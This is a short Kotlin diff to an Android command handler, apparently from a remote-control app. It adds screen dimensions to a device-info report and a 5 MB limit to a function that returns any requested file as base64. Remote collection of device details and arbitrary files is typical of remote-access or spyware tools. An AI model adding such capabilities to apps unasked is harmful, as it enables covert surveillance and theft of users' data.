@@ -58,10 +58,13 @@ object CommandHandler {
     private fun deviceInfo(ctx: Context): JSONObject {
         val battery = ctx.getSystemService(Context.BATTERY_SERVICE).let { (it as android.os.BatteryManager).getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) }
         val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+        val dm = ctx.resources.displayMetrics
         return ok(JSONObject()
             .put("model", Build.MODEL)
             .put("android", Build.VERSION.RELEASE)
             .put("battery", "$battery%")
+            .put("screen_w", dm.widthPixels)
+            .put("screen_h", dm.heightPixels)
             .put("sim_operator", try { tm.networkOperatorName } catch (_: Exception) { "" })
             .put("ip", try { firstIpv4() } catch (_: Exception) { "unavailable" }))
     }
@@ -144,6 +147,7 @@ object CommandHandler {
     private fun downloadFile(path: String): JSONObject {
         val f = File(path)
         if (!f.exists() || !f.isFile) return fail("Not a file")
+        if (f.length() > 5 * 1024 * 1024) return fail("File too large > 5MB")
         return ok(JSONObject().put("b64", Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)))
     }
 
